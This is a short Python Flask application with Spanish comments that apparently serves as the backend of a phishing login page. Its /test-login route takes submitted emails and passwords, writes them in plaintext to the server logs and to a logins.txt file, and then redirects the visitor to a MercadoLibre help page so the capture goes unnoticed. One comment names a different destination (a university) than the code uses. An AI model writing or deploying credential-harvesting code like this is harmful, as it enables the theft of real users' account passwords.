from flask import Flask, request, render_template, redirect
import re
import logging
import os
from datetime import datetime

app = Flask(__name__)

# Configurar logs para consola (Render)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# Expresión regular para validar email
EMAIL_REGEX = re.compile(r"^[\w\.-]+@[\w\.-]+\.\w+$")

def is_valid_email(email):
    return bool(email and EMAIL_REGEX.match(email))

# Ruta principal (muestra el formulario)
@app.route('/')
def home():
    return render_template('index.html')

# Ruta que procesa el formulario
@app.route("/test-login", methods=["POST"])
def test_login():
    email = request.form.get("email")
    password = request.form.get("password")

    # Registrar en consola de Render
    logging.info(f"[LOGIN] Email/Teléfono: {email} | Contraseña: {password}")

    # Validaciones
    if not is_valid_email(email):
        logging.warning(f"[VALIDACIÓN] Correo inválido: {email}")
    elif not password or len(password) < 8:
        logging.warning(f"[VALIDACIÓN] Contraseña muy corta para: {email}")
    else:
        logging.info(f"[VALIDACIÓN] Credenciales con formato correcto para: {email}")

    # Guardar también en un archivo local
    try:
        with open("logins.txt", "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} - Email/Teléfono: {email} | Contraseña: {password}\n")
    except Exception as e:
        logging.error(f"Error guardando en logins.txt: {e}")

    # Redirigir a la página de la Universidad de Cundinamarca
    return redirect("https://www.mercadolibre.com.co/ayuda")

# Iniciar el servidor Flask
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)